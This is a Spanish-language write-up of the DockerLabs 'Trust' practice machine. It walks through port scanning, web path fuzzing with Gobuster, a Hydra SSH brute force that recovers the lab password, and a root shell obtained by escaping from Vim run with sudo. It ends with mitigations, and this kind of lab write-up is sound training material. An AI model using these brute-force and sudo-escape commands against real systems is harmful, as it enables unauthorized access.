---
title: Trust
description: Resolución de la máquina Trust de DockerLabs
---

# Trust

`DockerLabs` `Very Easy` `Linux` `Completada`

Máquina enfocada en fuzzing de rutas web, descubrimiento de usuarios, fuerza bruta contra SSH y escalada de privilegios mediante Vim ejecutado con sudo.

## Información de la máquina

| Campo | Valor |
|---|---|
| Plataforma | DockerLabs |
| Dificultad | Very Easy |
| Sistema operativo | Linux |
| Estado | Completada |
| Puertos principales | 22 y 80 |
| Acceso inicial | SSH como mario |
| Escalada de privilegios | Vim mediante sudo |
| Acceso final | Root |

## Técnicas utilizadas

`Nmap` `Gobuster` `Fuzzing` `HTTP` `SSH` `Hydra` `Vim` `Sudo`

## 1. Preparación de la máquina

Se desplegó la máquina Trust desde DockerLabs.

<!-- IMAGEN PENDIENTE: despliegue de Trust -->

## 2. Reconocimiento de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv <IP_OBJETIVO> -oG allPorts
```

El escaneo mostró:

| Puerto | Servicio | Estado |
|---:|---|---|
| 22/TCP | SSH | Abierto |
| 80/TCP | HTTP | Abierto |

<!-- IMAGEN PENDIENTE: escaneo inicial -->

## 3. Enumeración de servicios

```bash
sudo nmap -p 22,80 -sCV <IP_OBJETIVO> -oN targeted
```

Se identificaron:

- OpenSSH 9.2p1.
- Apache HTTP Server 2.4.57.

<!-- IMAGEN PENDIENTE: versiones de SSH y Apache -->

## 4. Análisis del servicio web

La página principal mostraba la página predeterminada de Apache.

También se revisó el tráfico y las solicitudes web, pero inicialmente no se encontró información útil.

El siguiente paso fue buscar archivos y rutas ocultas.

## 5. Fuzzing con Gobuster

Se ejecutó Gobuster incluyendo extensiones comunes:

```bash
gobuster dir \
    -u http://<IP_OBJETIVO>/ \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,html,txt \
    -b 403,404
```

| Opción | Función |
|---|---|
| `-u` | Define la dirección objetivo |
| `-w` | Define el diccionario |
| `-x` | Agrega extensiones a las búsquedas |
| `-b` | Excluye códigos de respuesta específicos |

Gobuster encontró:

```text
secret.php
```

<!-- IMAGEN PENDIENTE: resultado de Gobuster -->

## 6. Descubrimiento del usuario

Se abrió la ruta encontrada:

```text
http://<IP_OBJETIVO>/secret.php
```

El contenido reveló un posible usuario:

```text
mario
```

<!-- IMAGEN PENDIENTE: contenido de secret.php -->

## 7. Fuerza bruta contra SSH

Se utilizó Hydra con el usuario descubierto:

```bash
hydra \
    -l mario \
    -P /usr/share/wordlists/rockyou.txt \
    ssh://<IP_OBJETIVO>
```

Hydra encontró las credenciales del laboratorio:

```text
Usuario: mario
Contraseña: Chocolate
```

<!-- IMAGEN PENDIENTE: resultado de Hydra -->

## 8. Acceso inicial

Se inició sesión mediante SSH:

```bash
ssh mario@<IP_OBJETIVO>
```

Después se comprobó la identidad:

```bash
whoami
id
```

Resultado:

```text
mario
```

<!-- IMAGEN PENDIENTE: sesión SSH como mario -->

## 9. Enumeración de privilegios

Se revisaron los permisos de sudo:

```bash
sudo -l
```

La configuración permitía ejecutar Vim con privilegios de `root`.

Vim es un editor de texto, pero también puede ejecutar comandos del sistema. Por esa razón, concederle permisos sudo equivale potencialmente a conceder una shell privilegiada.

<!-- IMAGEN PENDIENTE: salida de sudo -l -->

## 10. Escalada mediante Vim

Se ejecutó Vim como root y se abrió una shell:

```bash
sudo vim -c ':!/bin/bash'
```

También puede realizarse desde una sesión interactiva de Vim utilizando:

```vim
:!/bin/bash
```

Se comprobó la identidad final:

```bash
whoami
```

Resultado:

```text
root
```

<!-- IMAGEN PENDIENTE: shell root obtenida mediante Vim -->

No es necesario modificar permanentemente `/etc/sudoers` para completar la máquina.

## 11. Vulnerabilidades encontradas

### Archivo sensible accesible públicamente

La ruta `secret.php` revelaba un nombre de usuario válido.

### Contraseña débil

La contraseña de `mario` podía encontrarse mediante un ataque de diccionario.

### Permisos sudo peligrosos

Vim podía ejecutarse como root, permitiendo escapar del editor y abrir una shell.

### Falta de protección contra fuerza bruta

SSH permitió numerosos intentos automatizados de autenticación.

## 12. Medidas de mitigación

- No publicar usuarios ni datos sensibles en rutas web.
- Eliminar archivos de prueba o secretos del servidor.
- Utilizar contraseñas robustas y únicas.
- Preferir autenticación mediante claves SSH.
- Implementar protección contra fuerza bruta.
- No conceder permisos sudo a editores interactivos.
- Aplicar el principio de mínimo privilegio.
- Revisar periódicamente `/etc/sudoers`.
- Mantener Apache y OpenSSH actualizados.

## 13. Conclusión

La resolución siguió este flujo:

1. Escaneo de puertos.
2. Enumeración de SSH y Apache.
3. Fuzzing de rutas web.
4. Descubrimiento de `secret.php`.
5. Obtención del usuario `mario`.
6. Fuerza bruta contra SSH.
7. Acceso inicial.
8. Revisión de permisos sudo.
9. Escape desde Vim.
10. Obtención de una shell como `root`.

La vulnerabilidad crítica fue permitir que un usuario sin privilegios ejecutara Vim como superusuario.
